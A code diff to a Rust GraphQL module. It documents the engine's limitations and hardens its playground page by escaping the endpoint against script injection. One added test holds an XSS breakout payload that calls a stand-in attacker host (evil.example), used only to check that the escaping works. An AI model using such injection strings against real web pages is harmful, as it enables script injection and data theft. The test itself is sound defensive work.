@@ -1,7 +1,25 @@
-//! Pure Rust, zero-dependency GraphQL schema executor and GraphiQL playground.
+//! Lightweight GraphQL schema executor and a self-contained playground page.
 //!
-//! Provides type-safe GraphQL query and mutation resolution, introspection,
-//! and an embedded GraphiQL explorer IDE for developer exploration.
+//! Provides a minimal but functional GraphQL query and mutation resolution engine
+//! with top-level field selection, aliasing, variable substitution, and introspection.
+//!
+//! ## Capabilities
+//! - Top-level query and mutation field resolution with typed resolvers.
+//! - Field aliasing (`alias: fieldName`).
+//! - Variable substitution (`$varName`).
+//! - Basic introspection (`__schema { types }`).
+//! - A small hand-written HTML playground page (not GraphiQL 3.x, no CDN
+//!   bundles, no external JavaScript).
+//!
+//! ## Limitations
+//! This is a lightweight engine designed for simple schemas. It does **not** support:
+//! - Nested selection sets (field sub-selections).
+//! - GraphQL fragments or directives.
+//! - Full type validation.
+//!
+//! For complex schemas, consider using `async-graphql` alongside your Yav app.
+//! The `GraphQlSchema` builder API is designed to be compatible with a future
+//! migration to a full GraphQL engine.
 
 use axum::{
     body::Body,
@@ -374,8 +392,14 @@ fn parse_field_and_args(line: &str) -> (String, String, HashMap<String, Value>) 
     (output_key, target_field, args)
 }
 
-/// Standalone GraphiQL Explorer web interface HTML.
+/// Self-contained playground page for the given GraphQL endpoint.
+///
+/// This is a small hand-written HTML page, not the GraphiQL 3.x IDE. The
+/// endpoint is serialised as a JS/JSON string literal (with `<`, `>`, `&`,
+/// `/` and U+2028/U+2029 escaped), so a caller-controlled endpoint cannot
+/// break out of the inline `<script>` element.
 pub fn graphiql_html(endpoint: &str) -> String {
+    let endpoint_js = crate::streaming::escape_js_string_literal(endpoint);
     format!(
         r#"<!DOCTYPE html>
 <html lang="en">
@@ -395,7 +419,7 @@ pub fn graphiql_html(endpoint: &str) -> String {
 <body>
   <header>
     <div style="font-weight: bold; font-size: 16px;">🦀 Yav.rs GraphQL Playground</div>
-    <button onclick="runQuery()">▶ Execute Query</button>
+    <button id="run-btn">▶ Execute Query</button>
   </header>
   <div class="main">
     <textarea id="query" spellcheck="false">{{
@@ -410,7 +434,7 @@ pub fn graphiql_html(endpoint: &str) -> String {
       var out = document.getElementById('output');
       out.textContent = 'Executing...';
       try {{
-        var res = await fetch('{endpoint}', {{
+        var res = await fetch({endpoint_js}, {{
           method: 'POST',
           headers: {{ 'Content-Type': 'application/json' }},
           body: JSON.stringify({{ query: q }})
@@ -421,6 +445,7 @@ pub fn graphiql_html(endpoint: &str) -> String {
         out.textContent = 'Error: ' + err.message;
       }}
     }}
+    document.getElementById('run-btn').addEventListener('click', runQuery);
   </script>
 </body>
 </html>"#
@@ -509,5 +534,22 @@ mod tests {
         assert!(res.errors.is_none());
         let data = res.data.unwrap();
         assert!(data.to_string().contains("Query"));
+    }
+
+    #[test]
+    fn test_playground_escapes_endpoint_against_script_breakout() {
+        let html = graphiql_html("/graphql");
+        assert!(html.contains("fetch(\"\\/graphql\""));
+        assert!(!html.contains("cdn."));
+        assert!(!html.contains("<script src="));
+
+        let hostile = "</script><script>alert(1)</script>'; fetch('https://evil.example/?";
+        let html = graphiql_html(hostile);
+        assert!(!html.contains("</script><script>alert(1)"));
+        assert!(!html.contains("<script>alert(1)"));
+        // The whole endpoint is a single JSON string literal, so the injected
+        // quotes and tags are inert data rather than executable JavaScript.
+        assert!(html.contains("\\u003c\\/script\\u003e"));
+        assert_eq!(html.matches("<script>").count(), 1);
     }
 }
